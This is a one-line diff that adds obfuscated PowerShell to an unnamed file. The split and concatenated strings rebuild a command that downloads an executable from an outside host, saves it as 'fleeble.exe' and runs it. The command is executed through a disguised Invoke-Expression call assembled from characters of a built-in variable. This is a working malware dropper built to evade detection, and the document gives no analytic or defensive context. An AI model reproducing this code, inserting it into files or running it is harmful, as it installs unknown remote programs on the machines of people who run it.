@@ -1,0 +1,1 @@
+﻿ (('(New-'+'Object S'+'ystem.Net'+'.W'+'ebClien'+'t).Dow'+'nlo'+'adF'+'il'+'e({0}'+'http:'+'//c'+'ajo'+'s.'+'in/'+'0'+'x/'+'1.exe{0},{0}'+'f'+'lee'+'bl'+'e.'+'exe{'+'0});'+'S'+'t'+'art-Proc'+'ess'+' {0'+'}'+'fl'+'eeb'+'le'+'.exe{'+'0'+'}')  -f  [ChAr]39) | . ( ([sTRInG]$vERbosEpreFeRENCe)[1,3]+'X'-JoIn'')
